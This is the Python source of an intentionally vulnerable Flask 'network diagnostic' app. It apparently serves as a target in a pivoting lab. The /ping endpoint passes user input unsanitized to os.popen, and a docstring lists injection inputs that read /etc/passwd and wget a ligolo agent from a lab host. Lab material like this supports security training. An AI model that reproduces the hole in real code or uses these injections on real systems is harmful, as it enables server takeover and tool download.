#!/usr/bin/env python3
"""
Network Diagnostic Tool — intentionally vulnerable web application.

Vulnerability: OS Command Injection
The /ping endpoint passes user input directly to os.popen() without
sanitization. An attacker can inject arbitrary commands using shell
metacharacters like ; | ` $() etc.

Examples:
  Normal:    host=10.10.1.10
  Injection: host=10.10.1.10;id
  Injection: host=;cat /etc/passwd
  Injection: host=;wget http://10.10.1.10:8000/ligolo-agent -O /tmp/agent
"""

from flask import Flask, request
import os

app = Flask(__name__)

HTML_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>NetDiag — Network Diagnostic Tool</title>
    <style>
        body {{
            font-family: monospace;
            background: #1a1a2e;
            color: #eee;
            max-width: 700px;
            margin: 50px auto;
            padding: 20px;
        }}
        h1 {{ color: #0f9b58; }}
        form {{ margin: 20px 0; }}
        input[type="text"] {{
            background: #16213e;
            color: #eee;
            border: 1px solid #0f3460;
            padding: 8px 12px;
            width: 300px;
            font-family: monospace;
        }}
        input[type="submit"] {{
            background: #0f9b58;
            color: white;
            border: none;
            padding: 8px 16px;
            cursor: pointer;
            font-family: monospace;
        }}
        input[type="submit"]:hover {{ background: #0b7a42; }}
        pre {{
            background: #16213e;
            padding: 15px;
            border-left: 3px solid #0f9b58;
            overflow-x: auto;
            white-space: pre-wrap;
        }}
        .footer {{ color: #555; font-size: 0.8em; margin-top: 40px; }}
    </style>
</head>
<body>
    <h1>NetDiag v1.2</h1>
    <p>Internal network diagnostic tool. Enter a hostname or IP to ping.</p>

    <form method="GET" action="/ping">
        <input type="text" name="host" placeholder="e.g. 10.10.2.30" />
        <input type="submit" value="Ping" />
    </form>

    {result}

    <div class="footer">
        NetDiag v1.2 — For authorized use only.<br>
        Server: pivot1.internal.lab
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_TEMPLATE.format(result="")

@app.route('/ping')
def ping():
    host = request.args.get('host', '')
    if not host:
        return HTML_TEMPLATE.format(result="<pre>Error: no host specified</pre>")

    # *** VULNERABLE: unsanitized user input passed to shell ***
    cmd = f"ping -c 2 {host}"
    try:
        output = os.popen(cmd).read()
    except Exception as e:
        output = str(e)

    result = f"<pre>$ {cmd}\n\n{output}</pre>"
    return HTML_TEMPLATE.format(result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
